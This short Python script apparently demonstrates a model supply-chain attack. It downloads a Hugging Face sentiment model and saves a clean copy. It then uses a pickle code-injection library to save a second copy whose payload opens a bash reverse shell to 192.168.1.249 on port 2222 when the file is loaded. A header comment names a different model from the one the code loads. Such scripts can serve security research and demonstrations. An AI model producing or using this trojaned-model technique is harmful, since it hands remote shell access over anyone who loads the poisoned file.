import torch
from pickle_codeinjection import PickleInject, get_payload
from transformers import AutoModelForSequenceClassification

#-----------------------------------------------------------------
# Download twitter-roberta-base-sentimnent model from huggingface
#  and save as safe-model.pt
#-----------------------------------------------------------------
pretrained_model_name = "ahmedrachid/FinancialBERT-Sentiment-Analysis"
model = AutoModelForSequenceClassification.from_pretrained(pretrained_model_name)
torch.save(model, "models/safe_model.pt")

#----------------------------------------------------------------
# Inject malicious code into the model
#  and save as unsafe_model.pt
#----------------------------------------------------------------
malicious_code = """screen -md bash -c 'bash -i >/dev/tcp/192.168.1.249/2222 2>&1 0<&1' """
payload = get_payload("system", malicious_code)

torch.save(
    model,
    "models/unsafe_model.pt",
    pickle_module=PickleInject([payload]),
)

